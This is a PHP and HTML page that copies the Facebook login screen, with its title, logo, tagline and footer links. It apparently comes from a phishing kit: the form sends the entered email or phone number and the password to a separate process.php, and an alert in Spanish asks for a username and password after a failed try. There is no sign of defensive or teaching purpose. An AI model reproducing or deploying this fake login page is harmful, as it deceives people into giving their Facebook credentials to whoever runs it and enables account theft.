<?php
if (isset($_GET['log'])) {
    if ($_GET['log']=="false") {
        ?>
        <script>
            alert('ingrese usuario y contraseña');
        </script>
        <?php
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="/images/fb_icon_325x325.png">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <main>
        <div class="row">
            <div class="col-logo">
                <img src="images/fb_logo.svg" alt="Logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="col-form">
                <div class="form-container">
                    <form action="process.php" method="post">
                        <input type="text" placeholder="Email address or phone number" name="usuario" require="true">
                        <input type="password" placeholder="Password" name="contra" require="true">
                        <input type="submit" class="btn-login" value="Login" />
                        <a href="#">Forgotten password?</a>
                        <button class="btn-new">Create new Account</button>
                    </form>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button>+</button></li>
            </ol>

            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
            </ol>
            <small>Facebook © 2022</small>
        </div>
    </footer>
</body>

</html>